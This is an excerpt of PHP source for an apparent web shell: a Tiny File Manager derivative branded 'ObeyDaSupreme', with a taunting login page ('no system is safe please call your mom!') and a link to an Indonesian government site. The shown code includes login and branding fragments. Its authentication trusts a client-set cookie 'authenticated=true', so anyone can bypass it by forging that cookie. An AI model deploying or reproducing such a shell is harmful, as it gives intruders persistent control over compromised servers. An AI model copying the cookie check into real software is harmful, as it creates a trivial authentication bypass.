...
if (isset($_COOKIE['authenticated']) && $_COOKIE['authenticated'] === 'true') {
    ...
    if (password_verify($_POST['fm_pwd'], $pass_hash)) {
        setcookie('authenticated', 'true', time() + 3600, "/"); // cookie berlaku 1 jam
...
if (!isset($_COOKIE['authenticated']) || $_COOKIE['authenticated'] !== 'true') {
    $error_message = isset($error) ? "<p style='color:red;'>$error</p>" : "";
    echo <<<HTML
<!DOCTYPE html>
<html>
<head>
...
<body>
  <div class="login-box">
    <h1>AH!!</h1>
    <p>SHITT! HERE WE GO AGAIN!</p>
    <form method="post">
      <input type="password" name="fm_pwd" placeholder="Enter Password" required />
      <br />
...
<?php
// Real config to bypass Tiny File Manager error
$auth_users = ['admin' => '$2y$10$abcdefghijklmnopqrstuvxyz123456789012345678901234567890'];
...
/**
 * System | File Manager ObeyDaSupreme
 * @author ObeyDaSupreme @2024
...
//Application Title
define('APP_TITLE', 'ObeyDaSupreme');
...
<form method="post" class="login-box" action="">
  <h2>AH!!</h2>
  <p style="color:#00f0ff; margin-top: -10px;">SHITT! HERE WE GO AGAIN!</p>
  <input type="text" name="fm_usr" id="fm_usr" placeholder="Username" required />
  <input type="password" name="fm_pwd" id="fm_pwd" placeholder="Password" required />
  <button type="submit">LOGIN</button>
</form>
                        ...
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">ObeyDaSupreme @ 2024</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://www.kominfo.go.id/" target="_blank" class="app-v-title"> File Manager ObeyDaSupreme <?php echo VERSION; ?></a></h3></p>
...
<head>
    ...
    <meta name="description" content="Welcome to ObeyDaSupreme PLAYGROUND, no system is safe please call your mom!">
    <meta name="author" content="ObeyDaSupreme @2023">
